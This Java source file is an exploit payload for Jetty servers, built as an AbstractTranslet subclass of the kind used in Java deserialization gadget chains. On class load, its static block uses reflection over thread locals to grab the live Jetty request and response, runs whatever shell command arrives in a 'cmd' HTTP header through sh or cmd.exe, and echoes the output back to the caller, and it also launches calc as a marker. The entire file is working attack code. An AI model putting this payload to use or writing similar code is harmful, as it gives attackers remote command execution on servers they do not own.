package com.firebasky.exp;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.lang.reflect.Method;

/**
 * jetty回显
 */
public class Echo_HttpConnection extends AbstractTranslet {
    static {
        try {
            getResponse();
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static void getResponse() throws Exception {
        Thread thread = Thread.currentThread();
        java.lang.reflect.Field threadLocals = Thread.class.getDeclaredField("threadLocals");
        threadLocals.setAccessible(true);
        Object threadLocalMap = threadLocals.get(thread);

        Class threadLocalMapClazz = Class.forName("java.lang.ThreadLocal$ThreadLocalMap");
        java.lang.reflect.Field  tableField = threadLocalMapClazz.getDeclaredField("table");
        tableField.setAccessible(true);
        Object[] objects = (Object[]) tableField.get(threadLocalMap);

        Class entryClass = Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry");
        java.lang.reflect.Field  entryValueField = entryClass.getDeclaredField("value");
        entryValueField.setAccessible(true);

        for (Object object : objects) {
            if (object != null) {
                Object valueObject = entryValueField.get(object);
                if (valueObject != null) {
                    if (valueObject.getClass().getName().equals("org.eclipse.jetty.server.HttpConnection")) {
                        Method getHttpChannel = valueObject.getClass().getDeclaredMethod("getHttpChannel");
                        getHttpChannel.setAccessible(true);
                        Object httpChannel  = getHttpChannel.invoke(valueObject);
                        Class<?> HttpChannel = httpChannel.getClass();

                        Object request = HttpChannel.getMethod("getRequest").invoke(httpChannel);
                        Object response = HttpChannel.getMethod("getResponse").invoke(httpChannel);
                        java.io.PrintWriter writer = (java.io.PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
                        Method getHeader = request.getClass().getMethod("getHeader",String.class);
                        String cmd1 = (String) getHeader.invoke(request, "cmd");
                        String[] cmd = !System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"sh", "-c", cmd1} : new String[]{"cmd.exe", "/c",cmd1};
                        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
                        java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
                        String output = s.hasNext() ? s.next() : "";
                        writer.write("by Firebasky:");
                        writer.write("\n"+output);
                        writer.close();
                    }
                }
            }
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
